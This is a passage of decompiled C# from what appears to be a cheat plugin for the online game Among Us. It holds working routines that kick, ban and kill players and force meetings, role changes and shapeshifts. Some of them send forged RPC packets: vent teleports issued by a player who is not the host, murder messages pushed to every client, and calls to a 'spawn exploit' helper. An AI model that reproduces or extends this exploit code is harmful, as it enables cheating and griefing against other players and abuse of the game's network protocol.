      messageWriter.Write(byte.MaxValue);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
    }

    private void KickAllFromVents()
    {
      try
      {
        if (Object.op_Equality((Object) ShipStatus.Instance, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "No map loaded - cannot kick from vents");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Map not loaded!");
        }
        else if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to kick from vents");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host!");
        }
        else
        {
          int num = 0;
          foreach (Vent allVent in (Il2CppArrayBase<Vent>) ShipStatus.Instance.AllVents)
          {
            VentilationSystem.Update((VentilationSystem.Operation) 5, allVent.Id);
            ++num;
          }
          ChocooPlugin.Logger.LogInfo((object) $"Kicked all players from {num.ToString()} vents");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Kick all from vents error: " + ex.Message));
      }
    }

    private void EndMeetingClientSided()
    {
      if (!Object.op_Inequality((Object) MeetingHud.Instance, (Object) null))
        return;
      MeetingHud.Instance.Close();
      if (Object.op_Inequality((Object) Camera.main, (Object) null))
      {
        Component component = ((Component) Camera.main).GetComponent("CameraFollow");
        if (Object.op_Inequality((Object) component, (Object) null))
        {
          try
          {
            FieldInfo field = ((Object) component).GetIl2CppType().GetField("IsMeeting");
            if (FieldInfo.op_Inequality(field, (FieldInfo) null))
              field.SetValue((Object) component, Object.op_Implicit(false));
          }
          catch
          {
          }
        }
      }
    }

    private void KickSelectedPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          ChocooPlugin.Logger.LogWarning((object) "No player selected for kick");
        else if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to kick players");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot kick without host, Skill issue :-(");
        }
        else
        {
          ClientData client = ((InnerNetClient) AmongUsClient.Instance).GetClient(ChocooPlugin.selectedHostKickTargetId);
          if (client != null)
          {
            string playerName = client.PlayerName;
            ((InnerNetClient) AmongUsClient.Instance).KickPlayer(ChocooPlugin.selectedHostKickTargetId, false);
            ChocooPlugin.Logger.LogInfo((object) ("Kicked player: " + playerName));
            if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
              DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, "<color=orange>[Host]</color> Kicked " + playerName, true);
          }
          else
            ChocooPlugin.Logger.LogWarning((object) ("Could not find client with ID: " + ChocooPlugin.selectedHostKickTargetId.ToString()));
          ChocooPlugin.selectedHostKickTargetId = -1;
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to kick player: " + ex.Message));
      }
    }

    private void ErrorKickSelectedPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          return;
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
          DestroyableSingleton<HudManager>.Instance?.Notifier?.AddDisconnectMessage("Must be host to errorkick.");
        else if (Object.op_Inequality((Object) LobbyBehaviour.Instance, (Object) null))
        {
          DestroyableSingleton<HudManager>.Instance?.Notifier?.AddDisconnectMessage("Errorkick only works in-game, not in lobby. Use Kick instead.");
        }
        else
        {
          ClientData client = ((InnerNetClient) AmongUsClient.Instance).GetClient(ChocooPlugin.selectedHostKickTargetId);
          if (client != null)
          {
            string playerName = client.PlayerName;
            ((InnerNetClient) AmongUsClient.Instance).SendLateRejection(client.Id, (DisconnectReasons) 215);
            ChocooPlugin.Logger.LogInfo((object) ("Errorkicked player: " + playerName));
            DestroyableSingleton<HudManager>.Instance?.Chat?.AddChat(PlayerControl.LocalPlayer, "<color=orange>[Host]</color> Errorkicked " + playerName, true);
          }
          ChocooPlugin.selectedHostKickTargetId = -1;
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ErrorKick error: " + ex.Message));
      }
    }

    private void BanSelectedPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          ChocooPlugin.Logger.LogWarning((object) "No player selected for ban");
        else if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to ban players");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot ban without host, Skill issue :-(");
        }
        else
        {
          ClientData client = ((InnerNetClient) AmongUsClient.Instance).GetClient(ChocooPlugin.selectedHostKickTargetId);
          if (client != null)
          {
            string playerName = client.PlayerName;
            ((InnerNetClient) AmongUsClient.Instance).KickPlayer(ChocooPlugin.selectedHostKickTargetId, true);
            ChocooPlugin.Logger.LogInfo((object) ("Banned player: " + playerName));
            if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
              DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, "<color=red>[Host]</color> Banned " + playerName, true);
          }
          else
            ChocooPlugin.Logger.LogWarning((object) ("Could not find client with ID: " + ChocooPlugin.selectedHostKickTargetId.ToString()));
          ChocooPlugin.selectedHostKickTargetId = -1;
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to ban player: " + ex.Message));
      }
    }

    private void ForceEndGame()
    {
      try
      {
        if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (Object.op_Inequality((Object) GameManager.Instance, (Object) null))
          {
            ChocooPlugin.isForcingGameEnd = true;
            GameManager.Instance.RpcEndGame((GameOverReason) 3, false);
            ChocooPlugin.isForcingGameEnd = false;
            ChocooPlugin.Logger.LogInfo((object) "Game ended successfully");
          }
          else
            ChocooPlugin.Logger.LogWarning((object) "GameManager.Instance is null - cannot end game");
        }
        else
          ChocooPlugin.Logger.LogWarning((object) "Must be host to force end game");
      }
      catch (Exception ex)
      {
        ChocooPlugin.isForcingGameEnd = false;
        ChocooPlugin.Logger.LogError((object) ("Force End Game error: " + ex.Message));
      }
    }

    private void TeleportPlayerToVent()
    {
      try
      {
        if (ChocooPlugin.selectedVotekickTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected for teleport");
        }
        else
        {
          AmongUsClient instance = AmongUsClient.Instance;
          if (Object.op_Equality((Object) instance, (Object) null) || !((InnerNetClient) instance).AmConnected)
          {
            ChocooPlugin.Logger.LogWarning((object) "Not connected");
          }
          else
          {
            PlayerControl target = (PlayerControl) null;
            foreach (PlayerControl cachedPlayer in this._cachedPlayers)
            {
              if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
              {
                target = cachedPlayer;
                break;
              }
            }
            if (Object.op_Equality((Object) target, (Object) null) || ((InnerNetObject) target).AmOwner)
            {
              ChocooPlugin.Logger.LogWarning((object) "Invalid target");
            }
            else
            {
              string ventName = ChocooPlugin.ventNames[ChocooPlugin.selectedVentId];
              if (((InnerNetClient) instance).AmHost)
              {
                if (Object.op_Inequality((Object) target.MyPhysics, (Object) null))
                  target.MyPhysics.RpcBootFromVent(ChocooPlugin.selectedVentId);
              }
              else
              {
                byte playerId = target.Data.PlayerId;
                ushort seqId;
                if (!ChocooPlugin._ventSeqIds.TryGetValue(playerId, out seqId))
                  seqId = (ushort) 1000;
                this.SendVentPair(instance, target, ChocooPlugin.selectedVentId, ((InnerNetClient) instance).HostId, seqId);
                ChocooPlugin._ventSeqIds[playerId] = (ushort) ((uint) seqId + 2U);
              }
              string playerName = target.Data.PlayerName;
              ChocooPlugin.Logger.LogInfo((object) $"Teleported {playerName} to {ventName}");
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Teleport to vent error: " + ex.Message));
      }
    }

    private void TeleportAllToVent()
    {
      try
      {
        AmongUsClient instance = AmongUsClient.Instance;
        if (Object.op_Equality((Object) instance, (Object) null) || !((InnerNetClient) instance).AmConnected || Object.op_Equality((Object) ShipStatus.Instance, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "Not connected or not in game");
        }
        else
        {
          string ventName = ChocooPlugin.ventNames[ChocooPlugin.selectedVentId];
          int num = 0;
          try
          {
            VentilationSystem.Update((VentilationSystem.Operation) 2, ChocooPlugin.selectedVentId);
            ++num;
          }
          catch (Exception ex)
          {
            ChocooPlugin.Logger.LogWarning((object) ("Failed to TP self: " + ex.Message));
          }
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && !cachedPlayer.Data.Disconnected && !((InnerNetObject) cachedPlayer).AmOwner)
            {
              if (((InnerNetClient) instance).AmHost)
              {
                if (Object.op_Inequality((Object) cachedPlayer.MyPhysics, (Object) null))
                {
                  cachedPlayer.MyPhysics.RpcBootFromVent(ChocooPlugin.selectedVentId);
                  ++num;
                }
              }
              else
              {
                byte playerId = cachedPlayer.Data.PlayerId;
                ushort seqId;
                if (!ChocooPlugin._ventSeqIds.TryGetValue(playerId, out seqId))
                  seqId = (ushort) 1000;
                this.SendVentPair(instance, cachedPlayer, ChocooPlugin.selectedVentId, ((InnerNetClient) instance).HostId, seqId);
                ChocooPlugin._ventSeqIds[playerId] = (ushort) ((uint) seqId + 2U);
                ++num;
              }
            }
          }
          ChocooPlugin.Logger.LogInfo((object) $"Teleported {num.ToString()} players (including you) to {ventName}");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Teleport all to vent error: " + ex.Message));
      }
    }

    private void SendVentPair(
      AmongUsClient client,
      PlayerControl target,
      int ventId,
      int toClientId,
      ushort seqId)
    {
      byte num1 = (byte) ((uint) seqId & (uint) byte.MaxValue);
      byte num2 = (byte) ((uint) seqId >> 8);
      ushort num3 = (ushort) ((uint) seqId + 1U);
      byte num4 = (byte) ((uint) num3 & (uint) byte.MaxValue);
      byte num5 = (byte) ((uint) num3 >> 8);
      this.SendUpdateSystemToClient(client, (SystemTypes) 37, ((InnerNetObject) target).NetId, new byte[4]
      {
        num1,
        num2,
        (byte) 2,
        (byte) (ventId & (int) byte.MaxValue)
      }, toClientId);
      this.SendUpdateSystemToClient(client, (SystemTypes) 37, ((InnerNetObject) target).NetId, new byte[4]
      {
        num4,
        num5,
        (byte) 5,
        (byte) (ventId & (int) byte.MaxValue)
      }, toClientId);
    }

    private void SendUpdateSystemToClient(
      AmongUsClient client,
      SystemTypes systemType,
      uint senderNetId,
      byte[] extraBytes,
      int targetClientId)
    {
      MessageWriter messageWriter = ((InnerNetClient) client).StartRpcImmediately(((InnerNetObject) ShipStatus.Instance).NetId, (byte) 35, (SendOption) 1, targetClientId);
      messageWriter.Write((byte) systemType);
      messageWriter.WritePacked(senderNetId);
      foreach (byte extraByte in extraBytes)
        messageWriter.Write(extraByte);
      ((InnerNetClient) client).FinishRpcImmediately(messageWriter);
    }

    private void ForceMeetingAsPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          ChocooPlugin.Logger.LogWarning((object) "No player selected for force meeting");
        else if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to force meeting");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot force meeting without host!");
        }
        else
        {
          PlayerControl playerControl = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
            {
              playerControl = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to force meeting");
          }
          else
          {
            string playerName = playerControl.Data.PlayerName;
            if (MeetingRoomManager.Instance != null)
            {
              MeetingRoomManager.Instance.AssignSelf(playerControl, (NetworkedPlayerInfo) null);
              playerControl.RpcStartMeeting((NetworkedPlayerInfo) null);
              DestroyableSingleton<HudManager>.Instance.OpenMeetingRoom(playerControl);
            }
            ChocooPlugin.Logger.LogInfo((object) ("Forced meeting as " + playerName));
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Force meeting as player error: " + ex.Message));
      }
    }

    private void KillSelectedPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          ChocooPlugin.Logger.LogWarning((object) "No player selected for kill");
        else if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to kill players");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot kill without host!");
        }
        else
        {
          PlayerControl targetPlayer = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
            {
              targetPlayer = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) targetPlayer, (Object) null))
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to kill");
          else if (Object.op_Equality((Object) targetPlayer, (Object) PlayerControl.LocalPlayer) && ChocooPlugin.GodModeEnabled)
          {
            ChocooPlugin.Logger.LogInfo((object) "God Mode: Skipped self-kill");
            if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
              return;
            DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("God Mode is active!");
          }
          else
            MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.KillSelectedDelayed(targetPlayer));
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Kill selected player error: " + ex.Message));
      }
    }

    private IEnumerator KillSelectedDelayed(PlayerControl targetPlayer)
    {
      string playerName = targetPlayer.Data.PlayerName;
      PlayerControl[] playerControlArray = this._cachedPlayers;
      for (int index = 0; index < playerControlArray.Length; ++index)
      {
        PlayerControl player = playerControlArray[index];
        MessageWriter writer = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 12, (SendOption) 1, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(player));
        MessageExtensions.WriteNetObject(writer, (InnerNetObject) targetPlayer);
        writer.Write(1);
        ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(writer);
        yield return (object) new WaitForSeconds(0.1f);
        writer = (MessageWriter) null;
        player = (PlayerControl) null;
      }
      playerControlArray = (PlayerControl[]) null;
      ChocooPlugin.Logger.LogInfo((object) ("Killed player: " + playerName));
    }

    private void TelekillSelectedPlayer()
    {
      if (ChocooPlugin.selectedHostKickTargetId == -1)
        return;
      if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        DestroyableSingleton<HudManager>.Instance?.Notifier?.AddDisconnectMessage("Cannot telekill without host!");
      else if (Object.op_Equality((Object) ShipStatus.Instance, (Object) null))
      {
        DestroyableSingleton<HudManager>.Instance?.Notifier?.AddDisconnectMessage("Telekill only works in-game!");
      }
      else
      {
        PlayerControl playerControl = (PlayerControl) null;
        foreach (PlayerControl cachedPlayer in this._cachedPlayers)
        {
          if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
          {
            playerControl = cachedPlayer;
            break;
          }
        }
        if (Object.op_Equality((Object) playerControl, (Object) null))
          return;
        if (Object.op_Equality((Object) playerControl, (Object) PlayerControl.LocalPlayer) && ChocooPlugin.GodModeEnabled)
        {
          DestroyableSingleton<HudManager>.Instance?.Notifier?.AddDisconnectMessage("God Mode is active!");
        }
        else
        {
          this._telekillOldPos = PlayerControl.LocalPlayer.GetTruePosition();
          foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
          {
            MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 12, (SendOption) 1, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(allPlayerControl));
            MessageExtensions.WriteNetObject(messageWriter, (InnerNetObject) playerControl);
            messageWriter.Write(1);
            ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
          }
          this._telekillSnapTimer = 0.75f;
          ChocooPlugin.Logger.LogInfo((object) ("Telekilled: " + (playerControl.Data?.PlayerName ?? "Unknown")));
        }
      }
    }

    private void KillAllPlayers()
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to kill all");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot kill all without host!");
        }
        else
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.KillAllDelayed());
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Kill all players error: " + ex.Message));
      }
    }

    private IEnumerator KillAllDelayed()
    {
      int killedCount = 0;
      PlayerControl[] playerControlArray1 = this._cachedPlayers;
      for (int index1 = 0; index1 < playerControlArray1.Length; ++index1)
      {
        PlayerControl targetPlayer = playerControlArray1[index1];
        if (!Object.op_Equality((Object) targetPlayer, (Object) null) && !Object.op_Equality((Object) targetPlayer.Data, (Object) null))
        {
          if (Object.op_Equality((Object) targetPlayer, (Object) PlayerControl.LocalPlayer) && ChocooPlugin.GodModeEnabled)
          {
            ChocooPlugin.Logger.LogInfo((object) "God Mode: Skipped self in kill all");
          }
          else
          {
            PlayerControl[] playerControlArray2 = this._cachedPlayers;
            for (int index2 = 0; index2 < playerControlArray2.Length; ++index2)
            {
              PlayerControl player = playerControlArray2[index2];
              MessageWriter writer = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 12, (SendOption) 1, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(player));
              MessageExtensions.WriteNetObject(writer, (InnerNetObject) targetPlayer);
              writer.Write(1);
              ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(writer);
              yield return (object) new WaitForSeconds(0.02f);
              writer = (MessageWriter) null;
              player = (PlayerControl) null;
            }
            playerControlArray2 = (PlayerControl[]) null;
            ++killedCount;
            targetPlayer = (PlayerControl) null;
          }
        }
      }
      playerControlArray1 = (PlayerControl[]) null;
      ChocooPlugin.Logger.LogInfo((object) ("Killed all players: " + killedCount.ToString()));
    }

    private void TurnPlayerToGhost()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          ChocooPlugin.Logger.LogWarning((object) "No player selected for turn to ghost");
        else if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to turn players to ghost");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot turn to ghost without host!");
        }
        else
        {
          PlayerControl playerControl = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
            {
              playerControl = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to turn to ghost");
          }
          else
          {
            string playerName = playerControl.Data.PlayerName;
            if (playerControl.Data.IsDead)
            {
              ChocooPlugin.Logger.LogWarning((object) (playerName + " is already dead/ghost"));
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage(playerName + " is already a ghost!");
            }
            else
            {
              RoleTypes roleTypes = !Object.op_Inequality((Object) playerControl.Data.Role, (Object) null) || !playerControl.Data.Role.IsImpostor ? (RoleTypes) 6 : (RoleTypes) 7;
              playerControl.RpcSetRole(roleTypes, true);
              ChocooPlugin.Logger.LogInfo((object) $"Turned {playerName} into {roleTypes.ToString()}");
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Turn to ghost error: " + ex.Message));
      }
    }

    private void RevivePlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          ChocooPlugin.Logger.LogWarning((object) "No player selected for revive");
        else if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to revive players");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot revive without host!");
        }
        else
        {
          PlayerControl playerControl = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
            {
              playerControl = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to revive");
          }
          else
          {
            string playerName = playerControl.Data.PlayerName;
            if (!playerControl.Data.IsDead)
            {
              ChocooPlugin.Logger.LogWarning((object) (playerName + " is already alive"));
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage(playerName + " is already alive!");
            }
            else
            {
              RoleTypes roleTypes = !Object.op_Inequality((Object) playerControl.Data.Role, (Object) null) ? (RoleTypes) 0 : (playerControl.Data.Role.Role != 7 ? (RoleTypes) 0 : (RoleTypes) 1);
              playerControl.RpcSetRole(roleTypes, true);
              ChocooPlugin.Logger.LogInfo((object) $"Revived {playerName} as {roleTypes.ToString()}");
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Revive player error: " + ex.Message));
      }
    }

    private void ForceShapeshiftPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          ChocooPlugin.Logger.LogWarning((object) "No player selected to shapeshift");
        else if (Object.op_Equality((Object) ChocooPlugin.selectedShapeshiftTarget, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "No shapeshift target selected");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Please select a target player to shapeshift into!");
        }
        else if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host to force shapeshift!");
        }
        else
        {
          PlayerControl target = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
            {
              target = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) target, (Object) null))
            return;
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CoForceShapeshift(target, ChocooPlugin.selectedShapeshiftTarget));
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForceShapeshiftPlayer error: " + ex.Message));
      }
    }

    [HideFromIl2Cpp]
    private IEnumerator CoForceShapeshift(PlayerControl target, PlayerControl shapeshiftInto)
    {
      ChocooPlugin.InjectSpawnExploitTo(target);
      yield return (object) new WaitForSeconds(0.3f);
      if (target.Data.RoleType != 5)
      {
        RoleTypes currentRole = target.Data.RoleType;
        target.RpcSetRole((RoleTypes) 5, true);
        yield return (object) new WaitForSeconds(0.5f);
        target.RpcShapeshift(shapeshiftInto, true);
        target.RpcSetRole(currentRole, true);
      }
      else
        target.RpcShapeshift(shapeshiftInto, true);
      ChocooPlugin.shapeshiftedPlayers[((InnerNetObject) target).NetId] = target;
      ChocooPlugin.Logger.LogInfo((object) $"Force shapeshifted {target.Data.PlayerName} into {shapeshiftInto.Data.PlayerName}");
    }

    private void UnshiftAll()
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host to unshift!");
        }
        else if (ChocooPlugin.shapeshiftedPlayers.Count == 0)
        {
          ChocooPlugin.Logger.LogWarning((object) "No players are currently shapeshifted");
        }
        else
        {
          ChocooPlugin.InjectSpawnExploitToAllPlayers();
          Thread.Sleep(200);
          int num = 0;
          foreach (KeyValuePair<uint, PlayerControl> keyValuePair in ChocooPlugin.shapeshiftedPlayers.ToList<KeyValuePair<uint, PlayerControl>>())
          {
            PlayerControl target = keyValuePair.Value;
            if (Object.op_Inequality((Object) target, (Object) null) && Object.op_Inequality((Object) target.Data, (Object) null))
            {
              try
              {
                ChocooPlugin.InjectSpawnExploitTo(target);
                Thread.Sleep(100);
                if (target.Data.RoleType == 5)
                {
                  target.RpcShapeshift(target, false);
                }
                else
                {
                  RoleTypes roleType = target.Data.RoleType;
                  target.RpcSetRole((RoleTypes) 5, true);
                  Thread.Sleep(100);
                  target.RpcShapeshift(target, false);
                  Thread.Sleep(100);
                  target.RpcSetRole(roleType, true);
                }
                ++num;
              }
              catch (Exception ex)
              {
                ChocooPlugin.Logger.LogError((object) $"Error unshifting player {target.PlayerId.ToString()}: {ex.Message}");
              }
            }
          }
          ChocooPlugin.shapeshiftedPlayers.Clear();
          ChocooPlugin.Logger.LogInfo((object) $"Unshifted {num.ToString()} players");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("UnshiftAll error: " + ex.Message));
      }
    }

    private void ForceVanishPlayer()
